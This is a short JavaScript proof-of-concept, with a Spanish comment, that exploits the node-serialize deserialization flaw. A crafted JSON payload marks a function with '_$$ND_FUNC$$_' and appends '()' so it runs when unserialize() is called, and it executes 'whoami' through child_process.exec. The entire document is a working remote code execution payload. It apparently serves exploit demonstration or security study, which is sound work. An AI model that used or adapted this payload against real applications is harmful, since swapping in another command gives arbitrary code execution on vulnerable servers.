var serialize = require('node-serialize');
// implementamos el IIFE para ejecutar el comando whoami colocando parentesis al final de la funcion anonima

var payload = '{"rce":"_$$ND_FUNC$$_function(){ require(\'child_process\').exec(\'whoami\', function(error, stdout, stderr) { console.log(stdout) }); }()"}';
serialize.unserialize(payload);
